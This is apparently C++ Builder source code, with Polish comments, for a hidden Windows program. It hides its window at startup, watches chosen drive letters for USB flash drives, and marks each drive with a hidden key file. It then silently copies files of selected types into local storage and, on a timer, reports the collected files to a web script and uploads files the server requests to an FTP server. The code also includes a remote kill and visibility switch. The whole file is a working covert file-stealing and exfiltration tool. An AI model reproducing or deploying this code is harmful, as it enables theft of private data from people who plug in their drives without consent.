/*
155
*/
//---------------------------------------------------------------------------

#include <vcl.h>
#include <stdio.h>
#include <inifiles.hpp>
#include <windows.h>
#include <filectrl.hpp>
#include <io.h>
#include <string>
#pragma hdrstop

#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "trayicon"
#pragma link "CGRID"
#pragma link "CSPIN"
#pragma resource "*.dfm"
TForm1 *Form1;
unsigned long __stdcall drugi_watek(void *args);
bool drugi_watek_status = false;
String litery_dyskow = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
String litery_FLASH = "F";
String list_storage;
int rescan_time = 60*10;
int registered_devices = 0;
long maxfilesize = 104857600;
double needspace = 5368709120.0;
bool anuluj = false;
bool terminateapp = false;
#define HDD 1
#define FLASH 2
bool DirIsBanned(String dirsource);
void GetBanList();
void UruchomDrugiWatek()
{
	if(drugi_watek_status) return;
	GetBanList();
	CreateThread(NULL,0,&drugi_watek,NULL,0,NULL);
}
void console(String ctext)
{
	String time = "[" + TimeToStr(Now().FormatString("hh:nn:ss")) + "] ";
	ctext = time+ctext;
	if(Form1->memo_console->Lines->Count > 500) Form1->memo_console->Lines->Delete(1);
	Form1->memo_console->Lines->Add(ctext);
}
String BajtToGB(double bajty)
{
	String wynik = FloatToStrF((bajty / 1024/1024/1024), ffNumber, 20, 2);;
	return wynik;
}
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
: TForm(Owner)
{
}
//---------------------------------------------------------------------------
void __fastcall TForm1::HideWindowOnStartTimer(TObject *Sender)
{
	console("Program uruchomiony.");
	if(!DirectoryExists("storage"))
	{
		console("Brak folderu danych. Tworze folder 'storage' w katalogu programu...");
		CreateDirectory("storage", NULL);
	}
	TIniFile *ini;
	ini = new TIniFile("storage\\config.ini");
	litery_FLASH = ini->ReadString("PANEL KONTROLNY", "USB", "F");
	editFLASH->Text = litery_FLASH;
	registered_devices = ini->ReadInteger("PANEL KONTROLNY", "RDevices", 0);
	spinCheck->Value = ini->ReadInteger("PANEL KONTROLNY", "CheckSec", 5);
    spinFTPTimer->Value = ini->ReadInteger("PANEL KONTROLNY", "FTPTimer", 10);
	spinPause->Value = ini->ReadInteger("PANEL KONTROLNY", "PauseMin", 10);
	spinMaxFile->Value = ini->ReadInteger("PANEL KONTROLNY", "MaxFileSize", 104857600);
	delete ini;
	ProgramTimer->Interval = spinCheck->Value*1000;
	T_FTPSend->Interval = spinFTPTimer->Value*1000*60;
	checkWORK->Checked = true;
	String temp;
	temp = "Ustawione pamieci FLASH to: "+litery_FLASH;
	console(temp);
        //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!ODKOMENTOWAĆ
	Form1->Hide();
        //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	Form1->HideWindowOnStart->Enabled = false;
	try
	{
		ext_list->Lines->LoadFromFile("storage\\rozszerzenia.txt");
	}
	catch(...)
	{
		ext_list->Lines->SaveToFile("storage\\rozszerzenia.txt");
	}
}
//---------------------------------------------------------------------------

unsigned long __stdcall drugi_watek(void *args)
{
	drugi_watek_status = true;
	//**********************************************************
	console("Sprawdzam pojemność dysków twardych...");
	String strTemp;
	double myfreespace = DiskFree(0);
	strTemp = "[HDD]Wolne miejsce na dysku programu: " + BajtToGB(myfreespace) + " GB - ("+myfreespace+" bajtów)"+" | Wymagam: "+BajtToGB(needspace)+" ("+needspace+" bajtów)";
	console(strTemp);
        if(needspace > myfreespace)
       	{
             	strTemp = "[HDD]Za mało miejsca na dysku programu! Wymagam: "+BajtToGB(needspace)+" ("+needspace+" bajtów)";
		console(strTemp);
                drugi_watek_status = false;
                terminateapp = true;
                return 1;
        }
	for(int i = 1; i < litery_dyskow.Length()+1; i++)
	{
		double discfree = DiskFree(i);
		String litera = litery_dyskow.SubString(i,1);
		/*if(discfree != -1)
		{
			for(int x = 1; x < litery_HDD.Length()+1; x++)
			{
				String literaHDD = litery_HDD.SubString(x,1);
				if(litera == literaHDD)
				{
					strTemp = "[HDD]Wolne miejsce ("+litera+"): " + BajtToGB(discfree) + " GB - ("+discfree+" bajtów)";
					console(strTemp);
				}
			}
		}*/
		for(int x = 1; x < litery_FLASH.Length()+1; x++)
		{
			String literaFLASH = litery_FLASH.SubString(x,1);
			if(litera == literaFLASH)
			{
				if(discfree == -1) strTemp = "[FLASH]Pamiec niedostepna ("+litera+").", console(strTemp);
				else 
				{
					strTemp = "[FLASH]Pamiec wykryta ("+litera+"): " + BajtToGB(discfree) + " GB - ("+discfree+" bajtów)";
					console(strTemp);
					console("Sprawdzam czy pamiec FLASH jest zarejestrowana, szukam pliku...");
					TIniFile *ini_flash;
					String sciezka_flash = litera+":\\RedDriveInfo.txt";
					ini_flash = new TIniFile(sciezka_flash);
					int rKlucz = ini_flash->ReadInteger("DANE", "Klucz", 0);
					FileSetAttr(sciezka_flash, faHidden);
					if(rKlucz == 0)
					{
						console("Brak klucza, generuję...");
						int wKlucz = (int)time(0)-registered_devices;
						registered_devices++;
						TIniFile *ini;
						ini = new TIniFile("storage\\config.ini");
						ini->WriteInteger("PANEL KONTROLNY", "RDevices", registered_devices);
						delete ini;
						strTemp = "Nowy klucz: "+IntToStr(wKlucz);
						console(strTemp);
						ini_flash->WriteInteger("DANE", "Klucz", wKlucz);
						ini_flash->WriteInteger("DANE", "LastScan", (int)time(0));
						console("Klucz zapisany na nośniku.");
						console("Tworzę katalog w 'storage' o nazwie wygenerowanego klucza...");
						char temp[512];
						String sciezka_local = "storage\\"+IntToStr(wKlucz);
						sprintf(temp, "%s", sciezka_local.c_str());
						CreateDirectory(temp, NULL);
						console("Skanuje pliki do skopiowania...");
						sciezka_flash = litera+":\\";
						try
						{
							Form1->DownloadDir(sciezka_flash, sciezka_local);
							ini_flash->WriteInteger("DANE", "LastScan", (int)time(0));
						}
						catch(...)
						{
							console("Wystąpił błąd połączenia z urządzeniem FLASH(USB). Kopiowanie plików mogło zakończyć się niepowodzeniem.");
						}
						console("Proces kopiowania plików został zakończony!!!");
					}
					else
					{
						int last_scan = ini_flash->ReadInteger("DANE", "LastScan", 0);
						strTemp = "Zidentyfikowano urządzenie, klucz: "+IntToStr(rKlucz);
						console(strTemp);
						if(last_scan+rescan_time > (int)time(0))
						{
							strTemp = "Urządzenie było skanowane w przeciągu ostatnich "+IntToStr(rescan_time/60)+" minut.";
							console(strTemp);
						}
						else
						{
							String sciezka_local = "storage\\"+IntToStr(rKlucz);
							if(DirIsBanned(sciezka_local))
							{
								console("Urzadzenie jest zbanowane w calosci. Zadne pliki nie zostana skopiowane.");
							}
							else
							{
								console("Skanuje pliki do skopiowania...");
								sciezka_flash = litera+":\\";
								try
								{
									Form1->DownloadDir(sciezka_flash, sciezka_local);
									ini_flash->WriteInteger("DANE", "LastScan", (int)time(0));
								}
								catch(...)
								{
									console("Wystąpił błąd połączenia z urządzeniem FLASH(USB). Kopiowanie plików mogło zakończyć się niepowodzeniem.");
								}
								console("Proces kopiowania plików został zakończony!!!");
							}
						}					
					}
					anuluj = false;
					delete ini_flash;
				}
			}
		}
	}
	//**********************************************************
	drugi_watek_status = false;
	return 1;
}
void __fastcall TForm1::ProgramTimerTimer(TObject *Sender)
{
        if(terminateapp) Application->Terminate();
	UruchomDrugiWatek();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button1Click(TObject *Sender)
{
	ProgramTimer->OnTimer(NULL);
}
//---------------------------------------------------------------------------


void __fastcall TForm1::buttonFLASHSetClick(TObject *Sender)
{
	litery_FLASH = editFLASH->Text;
        TIniFile *ini;
        ini = new TIniFile("storage\\config.ini");
        ini->WriteString("PANEL KONTROLNY", "USB", litery_FLASH);
        delete ini;
	String temp;
	temp = "Ustawiłeś FLASH na: "+litery_FLASH;
	console(temp);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::DownloadDir(String Dir, String storage_dir)
{
	TSearchRec sr;
	TSearchRec SPlik;
	String sciezka;
	String strTemp;
	char from[512];
	char target[512];
	if(FindFirst(Dir + "*.*", faAnyFile, sr) == 0)
	{
		do
		{
			if(anuluj) break;
			if(sr.Size > maxfilesize) continue;
			if((sr.Name != ".") & (sr.Name != ".."))
			{
				if(((sr.Attr & faDirectory) > 0))//odtworzenie struktury katalogów
				{
					String skatalog = Dir+sr.Name;
					skatalog.Delete(1,2);
					skatalog = storage_dir+skatalog;
					//console("skatalog: "+skatalog);
					if(DirIsBanned(skatalog))
					{
						console("[KATALOG JEST ZBANOWANY]: "+skatalog);
						continue;
					}
					else if(!DirectoryExists(skatalog))//tworzenie folderu, jesli nie istnieje
					{
						ForceDirectories(skatalog);
						console("[NOWY KATALOG]: "+skatalog);
					}
				}
				DownloadDir(Dir + sr.Name + "\\", storage_dir);
				if(((sr.Attr & faDirectory) > 0)) continue;
				String rozszerzenie = ExtractFileExt(sr.Name);
				bool ext_ok = false;
				for(int l = 0; l < ext_list->Lines->Count; l++)
				{
					if(ext_list->Lines->Strings[l] == rozszerzenie)
					{
						ext_ok = true;
					}
				}
				if(!ext_ok) continue;
				String sciezka = Dir+sr.Name;
				//strTemp = Dir + sr.Name+"["+IntToStr(sr.Size)+"]"+">>"+storage_dir;
				//console(sciezka);
				String sciezka_local = sciezka;
				sciezka_local.Delete(1,2);
				sciezka_local = storage_dir+sciezka_local;
				//console(sciezka_local);
				sprintf(from, "%s", sciezka.c_str());
				sprintf(target, "%s", sciezka_local.c_str());
				strTemp = "[SPRAWDZAM]: "+sciezka+" => "+sciezka_local;
				console(strTemp);
				if(CopyFile(from, target, true))
				{
					strTemp = "[SKOPIOWANO]: "+sciezka+" => "+sciezka_local;
					console(strTemp);
				}
				else
				{
					FindFirst(from, faAnyFile, SPlik);
					int size_remote = SPlik.Size;
					FindFirst(target, faAnyFile, SPlik);
					int size_local = SPlik.Size;
					if(size_local != size_remote)
					{
						CopyFile(from, target, false);
						strTemp = "[PODMIENIAM]: "+sciezka+" => "+sciezka_local;
						console(strTemp);
					}
					//strTemp = "!!![NIE SKOPIOWANO]: "+sciezka+" => "+sciezka_local;
					//console(strTemp);
				}
			}
		}
		while(FindNext(sr) == 0); 
		FindClose(sr);
	}
}


void __fastcall TForm1::buttonANULUJClick(TObject *Sender)
{
	anuluj = true;        
}
//---------------------------------------------------------------------------


void __fastcall TForm1::WindowVisibleControlTimer(TObject *Sender)
{
        TIniFile *ini;
        ini = new TIniFile("storage\\config.ini");
        int polecenie = ini->ReadInteger("PANEL KONTROLNY", "Widocznosc", -1);
        if(polecenie == -1) ini->WriteInteger("PANEL KONTROLNY", "Widocznosc", 321); 
        else if(polecenie == 321)
        {
                Form1->Show();
                ini->WriteInteger("PANEL KONTROLNY", "Widocznosc", 1);
        }
        else if(polecenie == 0)
        {
                Form1->Hide();
                ini->WriteInteger("PANEL KONTROLNY", "Widocznosc", 1);
        }
        else if(polecenie == 666)
        {
                ini->WriteInteger("PANEL KONTROLNY", "Widocznosc", 1);
                Idglobal::Sleep(3000);
                Application->Terminate();
        }
        delete ini;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::checkWORKClick(TObject *Sender)
{
        ProgramTimer->Enabled = checkWORK->Checked;
        T_FTPSend->Enabled = checkWORK->Checked;
        if(checkWORK->Checked)
        {
                editFLASH->Enabled = false;
                buttonFLASHSet->Enabled = false;
                spinCheck->Enabled = false;
                spinMaxFile->Enabled = false;
                spinPause->Enabled = false;
                spinFTPTimer->Enabled = false;
                ext_list->Enabled = false;
                buttonSaveExt->Enabled = false;
        }
        else
        {
                editFLASH->Enabled = true;
                buttonFLASHSet->Enabled = true;
                spinCheck->Enabled = true;
                spinMaxFile->Enabled = true;
                spinPause->Enabled = true;
                spinFTPTimer->Enabled = true;
                ext_list->Enabled = true;
                buttonSaveExt->Enabled = true;
        }
}
//---------------------------------------------------------------------------


void __fastcall TForm1::spinCheckChange(TObject *Sender)
{
        ProgramTimer->Interval = spinCheck->Value*1000;
        TIniFile *ini;
        ini = new TIniFile("storage\\config.ini");
        ini->WriteInteger("PANEL KONTROLNY", "CheckSec", spinCheck->Value);
        delete ini;
        String strTemp;
        strTemp = "Sprawdzanie dysków co: "+IntToStr(spinCheck->Value)+" sekund.";
        console(strTemp);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::spinCheckKeyPress(TObject *Sender, char &Key)
{
        Key = 0;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::spinPauseChange(TObject *Sender)
{
        rescan_time = 60*spinPause->Value;
        TIniFile *ini;
        ini = new TIniFile("storage\\config.ini");
        ini->WriteInteger("PANEL KONTROLNY", "PauseMin", spinPause->Value);
        delete ini;
        String strTemp;
        strTemp = "Przerwa po pracy: "+IntToStr(spinPause->Value)+" minut.";
        console(strTemp);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::spinPauseKeyPress(TObject *Sender, char &Key)
{
        Key = 0;
}
//---------------------------------------------------------------------------


void __fastcall TForm1::spinMaxFileKeyPress(TObject *Sender, char &Key)
{
        Key = 0;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::spinMaxFileChange(TObject *Sender)
{
        maxfilesize = spinMaxFile->Value*1024*1024;
        TIniFile *ini;
        ini = new TIniFile("storage\\config.ini");
        ini->WriteInteger("PANEL KONTROLNY", "MaxFileSize", spinMaxFile->Value);
        delete ini;
        String strTemp;
        strTemp = "Maxymalna wielkość pliku: "+IntToStr(spinMaxFile->Value)+"MB ("+IntToStr(maxfilesize)+" bajtów).";
        console(strTemp);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::spinFTPTimerChange(TObject *Sender)
{
        T_FTPSend->Interval = spinFTPTimer->Value*1000*60;
        TIniFile *ini;
        ini = new TIniFile("storage\\config.ini");
        ini->WriteInteger("PANEL KONTROLNY", "FTPTimer", spinFTPTimer->Value);
        delete ini;
        String strTemp;
        strTemp = "Wysyłanie na FTP co: "+IntToStr(spinFTPTimer->Value)+" minut.";
        console(strTemp);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::spinFTPTimerKeyPress(TObject *Sender, char &Key)
{
        Key = 0;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::buttonSaveExtClick(TObject *Sender)
{
        ext_list->Lines->SaveToFile("storage\\rozszerzenia.txt");
        console("Rozszerzenia plików zostały zapisane: storage\\rozszerzenia.txt");
}
//---------------------------------------------------------------------------
String HttpPost(TIdHTTP *idhttp, AnsiString url, AnsiString postdata)
{
    TStringStream *pst = new TStringStream(postdata);
    TStringStream *rece = new TStringStream(NULL);
    idhttp->Request->ContentType="application/x-www-form-urlencoded";
    idhttp->Request->UserAgent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
    idhttp->Post(url, pst, rece);
    String wynik = rece->DataString;
    delete pst;
    delete rece;
    return wynik;
}
void CopyToFTP(String source, String dest)
{
	if(Form1->FTP->Connected())
	{
		//tworzenie gałęzi katalogu
		char str[512];
		sprintf(str, "%s", dest.c_str());
		char split[] = "\\";
		char *directory;
		directory = strtok(str, split);
                int folders_count = 0;
                int f_created = 0;
                for(int c = 0; c < dest.Length(); c++)
                {
                        if(dest.SubString(c, 1) == "\\") folders_count++;
                }
		while(directory != NULL && f_created < folders_count)
		{
			try
			{
				Form1->FTP->MakeDir(directory);
				Form1->FTP->ChangeDir(directory);
			}
			catch(...)
			{
				Form1->FTP->ChangeDir(directory);
			}
			directory = strtok(NULL, split);
                        f_created++;
		}
		while(Form1->FTP->RetrieveCurrentDir() != "/")
		{
			Form1->FTP->ChangeDirUp();
		}
		//zakończenie tworzenia gałęzi katalogu
                dest = StringReplace(dest, "\\", "//", TReplaceFlags() << rfReplaceAll);
                Form1->FTP->Put(source, dest, true);
	}
}



void __fastcall TForm1::FTPConnected(TObject *Sender)
{
        console("Połączono z serwerem FTP!");
}
//---------------------------------------------------------------------------


void __fastcall TForm1::FTPDisconnected(TObject *Sender)
{
        console("Rozłączono z serwerem FTP!");
}
//---------------------------------------------------------------------------


void __fastcall TForm1::ListStorage(String Dir)
{
  TSearchRec sr;
  if(FindFirst(Dir + "*.*", faAnyFile, sr) == 0)
     {
      do{
         if((sr.Name != ".") & (sr.Name != ".."))
           {
            ListStorage(Dir + sr.Name + "\\");
            list_storage = list_storage+ Dir + sr.Name + "|";
           }
        }
        while(FindNext(sr) == 0);
        FindClose(sr);
     }
}

int DeleteDirectory(const std::string &refcstrRootDirectory, bool bDeleteSubdirectories = true)
{
  bool            bSubdirectory = false;       // Flag, indicating whether
                                               // subdirectories have been found
  HANDLE          hFile;                       // Handle to directory
  std::string     strFilePath;                 // Filepath
  std::string     strPattern;                  // Pattern
  WIN32_FIND_DATA FileInformation;             // File information


  strPattern = refcstrRootDirectory + "\\*.*";
  hFile = ::FindFirstFile(strPattern.c_str(), &FileInformation);
  if(hFile != INVALID_HANDLE_VALUE)
  {
    do
    {
      if(FileInformation.cFileName[0] != '.')
      {
        strFilePath.erase();
        strFilePath = refcstrRootDirectory + "\\" + FileInformation.cFileName;

        if(FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
          if(bDeleteSubdirectories)
          {
            // Delete subdirectory
            int iRC = DeleteDirectory(strFilePath, bDeleteSubdirectories);
            if(iRC)
              return iRC;
          }
          else
            bSubdirectory = true;
        }
        else
        {
          // Set file attributes
          if(::SetFileAttributes(strFilePath.c_str(),
                                 FILE_ATTRIBUTE_NORMAL) == FALSE)
            return ::GetLastError();

          // Delete file
          if(::DeleteFile(strFilePath.c_str()) == FALSE)
            return ::GetLastError();
        }
      }
    } while(::FindNextFile(hFile, &FileInformation) == TRUE);

    // Close handle
    ::FindClose(hFile);

    DWORD dwError = ::GetLastError();
    if(dwError != ERROR_NO_MORE_FILES)
      return dwError;
    else
    {
      if(!bSubdirectory)
      {
        // Set directory attributes
        if(::SetFileAttributes(refcstrRootDirectory.c_str(),
                               FILE_ATTRIBUTE_NORMAL) == FALSE)
          return ::GetLastError();

        // Delete directory
        if(::RemoveDirectory(refcstrRootDirectory.c_str()) == FALSE)
          return ::GetLastError();
      }
    }
  }

  return 0;
}

void GetBanList()
{
	String strTemp;
	console("Pobieram liste folderow zbanowanych...");
	try
	{
		strTemp = Form1->HTTP->Get("http://127.0.0.1/script/script_put.php?ban=1");
		if(strTemp == "NULL")
		{
			console("Lista folderow zbanowanych jest pusta.");
			return;
		}
		char str[4096];
		sprintf(str, "%s", strTemp.c_str());
		char korektor[] = "|";
		char *schowek;
		schowek = strtok( str, korektor );
		Form1->banlist->Clear();
		while( schowek != NULL )
		{
			Form1->banlist->Lines->Add(schowek);
			schowek = strtok(NULL, korektor);
		}
		console("Pobrano liste folderow zbanowanych.");	
	}
	catch(...)
	{
		console("Wystąpił błąd podczas pobierania folderów zbanowanych.");
	}
}

void DeleteBannedFlies()
{
	int queue_count = Form1->banlist->Lines->Count;
	String dir;
	console("Usuwam foldery zbanowane...");
	for(int q = 0; q < queue_count; q++)
	{
		dir = Form1->banlist->Lines->Strings[q];
		try
		{
			DeleteDirectory(dir.c_str());
		}
		catch(...)
		{
			console("Wystapil niespodziewany blad podczas usuwania folderu zbanowanego.");
		}
	}
	console("Usunieto foldery zbanowane...");
}

bool DirIsBanned(String dirsource)
{
	int queue_count = Form1->banlist->Lines->Count;
	String dir;
	for(int q = 0; q < queue_count; q++)
	{
		dir = Form1->banlist->Lines->Strings[q];
		if(dirsource == dir) return true;
	}
	return false;
}

void __fastcall TForm1::FTPSendTimer(TObject *Sender)
{
	T_FTPSend->Enabled = false;
        //usuwanie plików zbanowanych
	GetBanList();
	DeleteBannedFlies();
        //koniec usuwania plików zbanowanych
       	//listowanie i eksport listy plików storage
	list_storage = "";
	ListStorage("storage\\");
	//console(list_storage);
	try
	{
		HttpPost(HTTP, "http://127.0.0.1/script/script_list.php", "list="+list_storage);
	}
	catch(...)
	{
		console("Wystąpił błąd z wysłaniem aktualnej bazy danych plików.");
	}
        	//koniec listowania i eksportu listy plików storage
        	//przesył plików na FTP'a
	console("Próba łączenia z serwerem FTP...");
	if(!FTP->Connected())FTP->Connect();
	if(FTP->Connected())
	{
		try
		{
			console("Pobieram liste plików do wysłania...");
			String strTemp;
			String spacer;
			String sciezka;
			strTemp = HTTP->Get("http://127.0.0.1/script/script_put.php");

			if(strTemp != "NULL")
			{
				char str[4096];
				sprintf(str, "%s", strTemp.c_str());
				char korektor[] = "|";
				char *schowek;
				schowek = strtok( str, korektor );
				queue_ftp_send->Clear();
				while( schowek != NULL )
				{
					queue_ftp_send->Lines->Add(schowek);
					schowek = strtok(NULL, korektor);
				}
				console("Pobrano liste plików do wysłania.");
				console("Rozpoczynam wysyłanie plików na serwer FTP...");
				Idglobal::Sleep(1000);
				int queue_count = queue_ftp_send->Lines->Count;
				String file;
				for(int q = 0; q < queue_count; q++)
				{
					file = queue_ftp_send->Lines->Strings[q];
					try
					{
						strTemp = "[WYSYLANIE] " + file;
						queue_ftp_send->Lines->Strings[q] = strTemp;
						CopyToFTP(file, file);
						strTemp = "[WYSLANO] " + file;
					}
					catch(...)
					{
						strTemp = "[NIE WYSLANO] " + file;
					}
					queue_ftp_send->Lines->Strings[q] = strTemp;
				}
				console("Procedura wysyłania plików została zakończona. Rozłączam się z serwerem FTP.");
			}
			else 
			{
				console("Lista plików do wysłania jest pusta.");
			}
			FTP->Disconnect();
		}
		catch(...)
		{
			FTP->Disconnect();
			console("Wystąpił błąd przygotowywania listy plików do wysłania.");
		}
	}
        //koniec przesyłu plików na FTP'a
	T_FTPSend->Enabled = true;
}
//---------------------------------------------------------------------------

